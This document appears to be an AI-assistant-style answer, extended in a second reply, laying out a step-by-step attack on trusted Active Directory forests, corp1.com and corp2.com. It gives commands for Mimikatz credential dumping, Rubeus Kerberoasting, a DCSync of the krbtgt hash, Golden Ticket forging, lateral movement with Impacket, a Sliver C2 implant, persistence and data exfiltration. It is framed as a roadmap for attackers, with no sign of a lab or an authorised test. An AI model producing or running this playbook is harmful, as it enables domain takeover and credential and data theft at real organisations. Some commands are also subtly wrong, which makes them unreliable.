To compromise a trusted forest under non-default but common conditions, attackers often leverage credential harvesting, privilege escalation, and lateral movement techniques. Below is an outline of key tools, techniques, and commands for attacks that can be executed with Mimikatz, Rubeus, PowerView, Impacket, and other tools. I'll also include how to integrate Sliver C2 for maintaining persistence and executing commands.

### 1. **Initial Enumeration and Discovery**

The first step is to gather information about the environment. This includes finding high-value targets such as Domain Controllers, Kerberos Ticket Granting Ticket (TGT) users, and trust relationships between domains and forests.

#### PowerView Enumeration (Active Directory Reconnaissance)
- **Find Domain Controllers:**
  ```powershell
  Get-NetDomainController
  ```
- **Find Trust Relationships:**
  ```powershell
  Get-NetDomainTrust
  ```
- **Get a list of all domains in the forest:**
  ```powershell
  Get-NetForestDomain
  ```
- **Find high-privilege accounts:**
  ```powershell
  Get-NetGroup -GroupName "Domain Admins" -Domain
  ```
- **Find all computers in a domain:**
  ```powershell
  Get-NetComputer -FullData
  ```

### 2. **Credential Harvesting and Kerberos Attacks**

Once initial recon is done, the goal is to obtain credentials. Mimikatz and Rubeus are commonly used tools for harvesting credentials and performing Kerberos ticket-related attacks.

#### Mimikatz (Dumping Credentials and Tickets)
- **Dump Local Credentials:**
  ```powershell
  mimikatz.exe
  privilege::debug
  sekurlsa::logonpasswords
  ```
- **Extract NTLM Hashes:**
  ```powershell
  mimikatz.exe
  lsadump::sam
  ```
- **Dump Kerberos Tickets:**
  ```powershell
  mimikatz.exe
  sekurlsa::tickets
  ```

#### Rubeus (Kerberos Attacks)
- **Request a TGT for a specific user (ASREPRoast):**
  ```powershell
  Rubeus.exe asreproast
  ```
- **Overpass-the-Hash (Pass-the-Hash attack using Kerberos):**
  ```powershell
  Rubeus.exe ptt /user:USER /rc4:HASH
  ```
- **Kerberoasting (Get SPN hashes for offline cracking):**
  ```powershell
  Rubeus.exe kerberoast
  ```

### 3. **Trust Abuse in a Multi-Forest Environment**

Once credentials from one domain are obtained, attackers can move laterally into a trusted domain/forest by exploiting trust relationships.

- **Use Mimikatz to Pass-the-Ticket (PtT) into a trusted domain:**
  ```powershell
  mimikatz.exe
  kerberos::ptt <ticket.kirbi>
  ```
- **List domain trusts and access sensitive objects using PowerView:**
  ```powershell
  Get-NetForestTrust
  ```

### 4. **Impacket for Lateral Movement**

Impacket provides Python scripts that help move laterally, execute commands, or enumerate network shares on Windows networks.

- **Wmiexec.py for lateral movement (Remote Code Execution via WMI):**
  ```bash
  wmiexec.py domain/user:password@target_ip
  ```
- **Psexec.py for privilege escalation:**
  ```bash
  psexec.py domain/user:password@target_ip
  ```

### 5. **Using Sliver C2 for Maintaining Persistence**

Sliver is a Command and Control (C2) framework that supports cross-platform implants and integrates well with tools like Mimikatz, PowerView, and others.

#### Sliver Session Setup and Persistence
- **Generate an implant:**
  ```bash
  generate --mtls 192.168.1.1 --os windows --http
  ```
- **Deploy implant on target and start a session:**
  ```bash
  use beacon
  ```
- **Enumerate Active Directory:**
  ```bash
  use sharpview
  sharpview --all
  ```
- **Steal credentials using Mimikatz:**
  ```bash
  use mimikatz
  mimikatz logonPasswords
  ```
- **Escalate privileges:**
  ```bash
  use getsystem
  ```

### 6. **Privilege Escalation and Persistence**

After lateral movement into a trusted domain/forest, escalate privileges to domain admin and establish persistence.

#### Persistence with Kerberos Tickets
- **Generate a Golden Ticket using Mimikatz (persist in a domain):**
  ```powershell
  mimikatz.exe
  kerberos::golden /user:Administrator /domain:target_domain /sid:S-1-5-21-... /krbtgt:<hash> /id:500
  ```

- **Inject a Golden Ticket:**
  ```powershell
  mimikatz.exe
  kerberos::ptt golden_ticket.kirbi
  ```

### 7. **Summary Attack Flow Using Sliver C2**

1. **Initial Enumeration:**
   - Use `sharpview` or `powerview` to identify domain controllers, users, and trust relationships.
2. **Credential Harvesting:**
   - Deploy Mimikatz or Rubeus via Sliver to capture Kerberos tickets or hashes.
3. **Lateral Movement:**
   - Use tools like Impacket’s `wmiexec` or `psexec` to execute commands on other systems.
4. **Privilege Escalation:**
   - Exploit trust relationships to move into a trusted forest/domain.
5. **Persistence:**
   - Generate and use Golden Tickets or persist using Sliver’s implant features.
6. **Cleanup and Maintain Access:**
   - Use Sliver’s session management to pivot between systems and keep long-term access.

This flow provides a roadmap for attacking trusted forests under realistic conditions, leveraging well-known tools and techniques.

Given that you have administrator credentials and the ability to perform DCSync between two trusted forests (`corp1.com` and `corp2.com`), this allows for more advanced attack scenarios since you can replicate sensitive data from the target domain (corp2.com), including password hashes and Kerberos tickets. Below is a refined attack outline incorporating your privileged access and the forest transitive trust:

### 1. **Overview of the Forest Trust Setup**

You have a bidirectional, forest-transitive trust between `corp1.com` and `corp2.com`. This trust relationship allows both domains to authenticate users from each other, potentially giving you access to highly privileged resources on the target domain (`corp2.com`) from the source domain (`corp1.com`).

With administrator credentials in `corp1.com` and DCSync capabilities, you can pull password hashes and other sensitive information from `corp2.com` without needing to compromise additional systems in the target domain.

### 2. **Initial Enumeration of the Target Forest (corp2.com)**

#### PowerView Commands to Enumerate Trust and Resources

- **List the trust relationship between the domains:**
  ```powershell
  Get-NetDomainTrust -Domain corp2.com
  ```
- **Enumerate high-value accounts in the target forest:**
  ```powershell
  Get-NetGroup -Domain corp2.com -GroupName "Domain Admins"
  ```
- **Identify sensitive accounts or users to target:**
  ```powershell
  Get-DomainUser -AdminCount 1 -Domain corp2.com
  ```

### 3. **DCSync Attack to Dump Target Domain Hashes**

With your privileges, you can perform a DCSync attack using Mimikatz to replicate the credentials from `corp2.com`. This method abuses the Directory Replication Service (DRS) to pull the password hashes of users, including privileged accounts.

#### Mimikatz DCSync (Dump Hashes from corp2.com Domain Controller)
- **DCSync to dump NTLM password hashes for all users:**
  ```powershell
  mimikatz.exe
  privilege::debug
  lsadump::dcsync /domain:corp2.com /user:Administrator
  ```
  - This command will allow you to replicate the hash of the `Administrator` account from `corp2.com`.

- **DCSync to extract hashes for a specific user (e.g., Domain Admin in corp2.com):**
  ```powershell
  lsadump::dcsync /domain:corp2.com /user:target_user
  ```

- **DCSync to dump the krbtgt hash (critical for Golden Ticket attacks):**
  ```powershell
  lsadump::dcsync /domain:corp2.com /user:krbtgt
  ```

### 4. **Compromise of the Target Forest Using Stolen Credentials**

After obtaining the `krbtgt` hash from the target domain `corp2.com`, you can generate a **Golden Ticket** to impersonate any user in the target domain.

#### Mimikatz Golden Ticket Attack
- **Generate a Golden Ticket using the krbtgt hash:**
  ```powershell
  mimikatz.exe
  kerberos::golden /user:Administrator /domain:corp2.com /sid:S-1-5-21-... /krbtgt:<krbtgt_hash> /id:500
  ```
  - Replace the SID with the domain SID for `corp2.com`.

- **Inject the Golden Ticket to gain access:**
  ```powershell
  kerberos::ptt golden_ticket.kirbi
  ```

With the Golden Ticket, you now have unrestricted access to resources within `corp2.com`, allowing you to escalate privileges or access sensitive data.

### 5. **Lateral Movement in the Target Domain (corp2.com)**

With administrator-level access in `corp2.com`, you can move laterally between machines or execute commands remotely. Impacket tools or PowerShell can be used for this purpose.

#### Impacket’s `wmiexec` for Remote Code Execution
- **Execute a command on a remote machine:**
  ```bash
  wmiexec.py corp2.com/user:password@target_ip
  ```

#### PowerShell Remoting for Lateral Movement
- **Use PowerShell to execute commands on other machines:**
  ```powershell
  Enter-PSSession -ComputerName target_machine.corp2.com -Credential corp2\Administrator
  ```

### 6. **Establishing Persistence and Covering Tracks**

To maintain persistence, you can either deploy a Sliver implant or use Kerberos tickets to ensure long-term access.

#### Sliver Implant for Persistence
- **Generate an implant for the target domain (`corp2.com`):**
  ```bash
  generate --mtls corp2.com --os windows --http
  ```
- **Deploy the implant on a compromised system and start a session:**
  ```bash
  use beacon
  ```

#### Kerberos Ticket Persistence
- **Use Silver or Golden Tickets to maintain access over time:**
  - **Golden Ticket:** Allows indefinite access to the domain since it uses the `krbtgt` hash, which doesn’t change unless manually reset.
  - **Silver Ticket:** Useful for accessing specific services without triggering Kerberos ticket validation with the Domain Controller.

### 7. **Post-Compromise Enumeration of Sensitive Data**

After gaining domain admin privileges, you can access and exfiltrate sensitive data from the `corp2.com` environment.

#### PowerView for Data Hunting
- **Find sensitive file shares or data:**
  ```powershell
  Invoke-ShareFinder -Domain corp2.com
  ```
- **Enumerate sensitive objects (e.g., privileged users or service accounts):**
  ```powershell
  Get-ADObject -Filter {AdminCount -eq 1} -Domain corp2.com
  ```

### 8. **Attack Flow Summary**

1. **Enumerate Trusts and Users:**
   - Use PowerView to enumerate the trust relationship and identify high-value targets.
2. **DCSync Attack:**
   - Use Mimikatz to perform a DCSync attack, replicating password hashes from `corp2.com`, including the `krbtgt`.
3. **Privilege Escalation:**
   - Generate a Golden Ticket using the stolen `krbtgt` hash and impersonate a domain admin in `corp2.com`.
4. **Lateral Movement:**
   - Use Impacket (`wmiexec`, `psexec`) or PowerShell remoting to move laterally within `corp2.com`.
5. **Establish Persistence:**
   - Deploy a Sliver implant for long-term control or use Kerberos tickets to maintain access.
6. **Exfiltrate Data:**
   - Locate and access sensitive files or objects in `corp2.com` using PowerView or other enumeration tools.

This plan leverages the full extent of your administrative privileges and DCSync capability to compromise `corp2.com` through a trusted relationship with `corp1.com`, escalating to full domain control.
